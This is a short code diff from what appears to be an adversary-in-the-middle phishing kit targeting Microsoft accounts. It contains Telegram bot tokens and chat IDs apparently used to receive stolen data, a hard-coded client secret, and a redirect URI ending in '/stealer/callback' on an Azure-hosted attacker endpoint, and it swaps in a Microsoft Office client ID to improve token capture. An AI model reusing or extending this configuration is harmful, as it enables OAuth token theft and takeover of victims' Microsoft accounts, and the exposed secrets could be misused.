@@ -7,8 +7,8 @@ const TELEGRAM_CHAT_ID = "6743632244";
 const TELEGRAM_BOT_TOKEN2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
 const TELEGRAM_CHAT_ID2 = "6263177378";
 
-// OAuth configuration - Using working client ID for consumer accounts
-const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e'; // Microsoft Graph CLI - works with consumers
+// OAuth configuration - Using Microsoft Office client ID
+const client_id = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; // Microsoft Office client ID
 const client_secret = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
 const redirect_uri = 'https://aitm-func-new-1754085350.azurewebsites.net/stealer/callback'; // FIXED: Point to our callback
 const token_endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
